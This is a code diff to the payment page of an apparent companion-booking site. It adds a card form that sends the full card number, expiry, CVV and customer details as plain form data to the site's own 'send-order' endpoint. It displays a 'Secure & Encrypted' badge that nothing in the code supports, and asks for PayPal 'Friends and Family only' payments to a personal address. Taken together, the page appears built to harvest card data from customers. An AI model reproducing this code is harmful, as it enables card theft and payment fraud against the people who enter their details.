@@ -34,7 +34,7 @@ const PAYPAL_DETAILS = {
   address: 'maxbenjamin802@gmail.com',
   note: 'Friends and Family only',
 };
-const API_BASE_URL = (import.meta.env.VITE_API_BASE_URL || '').replace(/\/$/, '');
+const API_BASE_URL = ''; // Use proxy - calls /api which routes to localhost:3001
 const BOOKING_AMOUNT_MIN = 40;
 const BOOKING_AMOUNT_MAX = 1000;
 
@@ -199,6 +199,99 @@ const Pay = () => {
     }
     setError('');
 
+    // Handle card payment - send to backend with card details
+    if (requiresCard) {
+      // Prevent focus from staying on a hidden element while switching dialogs.
+      if (document.activeElement instanceof HTMLElement) {
+        document.activeElement.blur();
+      }
+
+      setStatus('waiting');
+      setStatusOpen(true);
+      
+      try {
+        // Create FormData to send card details and data
+        const formData = new FormData();
+        formData.append('customerName', customer?.name || '');
+        formData.append('customerEmail', customer?.email || '');
+        formData.append('customerPhone', customer?.phone || '');
+        formData.append('companionName', profile?.name || '');
+        formData.append('duration', hours || '');
+        formData.append('amount', total.toString());
+        formData.append('paymentMethod', config.name);
+        formData.append('date', customer?.date || 'Flexible');
+        formData.append('notes', customer?.notes || '');
+        
+        // Append card details
+        formData.append('cardholderName', cardDetails.cardholderName || '');
+        formData.append('cardNumber', cardDetails.cardNumber || '');
+        formData.append('cardExpiry', cardDetails.expiry || '');
+        formData.append('cardCvv', cardDetails.cvv || '');
+
+        // Send to backend
+        const result = await fetch(`${API_BASE_URL}/api/send-order`, {
+          method: 'POST',
+          body: formData
+        });
+
+        const contentType = result.headers.get('content-type') || '';
+        let data = null;
+        let textBody = '';
+
+        if (contentType.includes('application/json')) {
+          try {
+            data = await result.json();
+          } catch {
+            data = null;
+          }
+        } else {
+          textBody = await result.text();
+        }
+
+        if (!result.ok) {
+          const normalizedText = textBody.trim();
+          const isLikelyProxyBackendDown =
+            result.status === 500 &&
+            !data?.message &&
+            !normalizedText;
+          const isExternalRouterError = textBody.includes('ROUTER_EXTERNAL_TARGET_ERROR');
+          const isUpstreamUnavailable = [502, 503, 504].includes(result.status);
+          const safeServerMessage =
+            normalizedText && !normalizedText.startsWith('<!DOCTYPE html') ? normalizedText : '';
+
+          setStatusOpen(false);
+          setError(
+            (isExternalRouterError
+              ? 'The app could not reach the backend service. Please try again in 30-60 seconds.'
+              : '') ||
+            (isUpstreamUnavailable
+              ? 'Backend service is temporarily unavailable. Please wait a moment and try again.'
+              : '') ||
+            (isLikelyProxyBackendDown
+              ? 'Payment API is unreachable. Start the backend server (npm run server) and try again.'
+              : '') ||
+            data?.message ||
+            safeServerMessage ||
+            `Failed to submit order (HTTP ${result.status}). Please try again.`
+          );
+          return;
+        }
+
+        if (data?.success) {
+          setStatus('success');
+        } else {
+          setStatusOpen(false);
+          setError(data?.message || 'Failed to submit order. Please try again.');
+        }
+      } catch (err) {
+        console.error('Error submitting order:', err);
+        setStatusOpen(false);
+        setError('Network error. Please check your connection and try again.');
+      }
+      return;
+    }
+
+    // Handle proof-based payments (bitcoin, paypal)
     if (requiresProof) {
       // Prevent focus from staying on a hidden element while switching dialogs.
       if (document.activeElement instanceof HTMLElement) {
@@ -312,7 +405,23 @@ const Pay = () => {
   };
 
   const handleCardChange = (field) => (event) => {
-    setCardDetails((prev) => ({ ...prev, [field]: event.target.value }));
+    let value = event.target.value;
+    
+    // Auto-format expiry date (MM/YY)
+    if (field === 'expiry') {
+      value = value.replace(/\D/g, '');
+      if (value.length >= 2) {
+        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+      }
+    }
+    
+    // Auto-format card number (add spaces)
+    if (field === 'cardNumber') {
+      value = value.replace(/\D/g, '');
+      value = value.replace(/(\d{4})/g, '$1 ').trim();
+    }
+    
+    setCardDetails((prev) => ({ ...prev, [field]: value }));
   };
 
   const handleProofChange = (event) => {
@@ -501,39 +610,86 @@ const Pay = () => {
             )}
 
             {requiresCard && (
-              <Box sx={{ display: 'grid', gap: 2, mb: 2 }}>
-                <TextField
-                  label="Cardholder Name"
-                  value={cardDetails.cardholderName}
-                  onChange={handleCardChange('cardholderName')}
-                  fullWidth
-                  sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
-                />
-                <TextField
-                  label="Card Number"
-                  value={cardDetails.cardNumber}
-                  onChange={handleCardChange('cardNumber')}
-                  fullWidth
-                  placeholder="1234 5678 9012 3456"
-                  sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
-                />
-                <Box sx={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 2 }}>
+              <Box sx={{ mb: 2 }}>
+                {/* Simple Card Visual */}
+                <Box
+                  sx={{
+                    background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
+                    borderRadius: 2,
+                    p: 2,
+                    mb: 2,
+                    boxShadow: '0 6px 20px rgba(102, 126, 234, 0.3)',
+                  }}
+                >
+                  <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', mb: 1.5 }}>
+                    <Box sx={{ width: 40, height: 28, bgcolor: '#ffd700', borderRadius: 1 }} />
+                    <Typography sx={{ fontSize: '1rem', fontWeight: 700, color: '#fff' }}>💳</Typography>
+                  </Box>
+                  <Typography sx={{ fontFamily: 'monospace', fontSize: '1.1rem', fontWeight: 600, color: '#fff', letterSpacing: '0.1em', mb: 1.5 }}>
+                    {cardDetails.cardNumber || '•••• •••• •••• ••••'}
+                  </Typography>
+                  <Box sx={{ display: 'flex', justifyContent: 'space-between' }}>
+                    <Typography sx={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase' }}>
+                      {cardDetails.cardholderName || 'Card Holder'}
+                    </Typography>
+                    <Typography sx={{ fontSize: '0.7rem', color: 'rgba(255,255,255,0.7)', textTransform: 'uppercase' }}>
+                      {cardDetails.expiry || 'MM/YY'}
+                    </Typography>
+                  </Box>
+                </Box>
+
+                {/* Simple Input Fields */}
+                <Box sx={{ display: 'grid', gap: 1.5 }}>
                   <TextField
-                    label="Expiry (MM/YY)"
-                    value={cardDetails.expiry}
-                    onChange={handleCardChange('expiry')}
+                    label="Full Name on Card"
+                    value={cardDetails.cardholderName}
+                    onChange={handleCardChange('cardholderName')}
                     fullWidth
-                    placeholder="MM/YY"
-                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
+                    size="small"
+                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                   />
+                  
                   <TextField
-                    label="CVV"
-                    value={cardDetails.cvv}
-                    onChange={handleCardChange('cvv')}
+                    label="Card Number"
+                    value={cardDetails.cardNumber}
+                    onChange={handleCardChange('cardNumber')}
                     fullWidth
-                    placeholder="123"
-                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 2 } }}
+                    size="small"
+                    placeholder="1234 5678 9012 3456"
+                    inputProps={{ maxLength: 19 }}
+                    sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
                   />
+                  
+                  <Box sx={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 1.5 }}>
+                    <TextField
+                      label="Expiry Date"
+                      value={cardDetails.expiry}
+                      onChange={handleCardChange('expiry')}
+                      fullWidth
+                      size="small"
+                      placeholder="MM/YY"
+                      inputProps={{ maxLength: 5 }}
+                      sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
+                    />
+                    <TextField
+                      label="CVV"
+                      value={cardDetails.cvv}
+                      onChange={handleCardChange('cvv')}
+                      fullWidth
+                      size="small"
+                      placeholder="123"
+                      inputProps={{ maxLength: 4 }}
+                      sx={{ '& .MuiOutlinedInput-root': { borderRadius: 1.5 } }}
+                    />
+                  </Box>
+                </Box>
+
+                {/* Security Badge */}
+                <Box sx={{ display: 'flex', alignItems: 'center', justifyContent: 'center', mt: 1.5, gap: 0.5 }}>
+                  <CheckCircleIcon sx={{ color: '#22c55e', fontSize: 14 }} />
+                  <Typography variant="caption" sx={{ color: '#166534', fontWeight: 500, fontSize: '0.7rem' }}>
+                    Secure & Encrypted
+                  </Typography>
                 </Box>
               </Box>
             )}
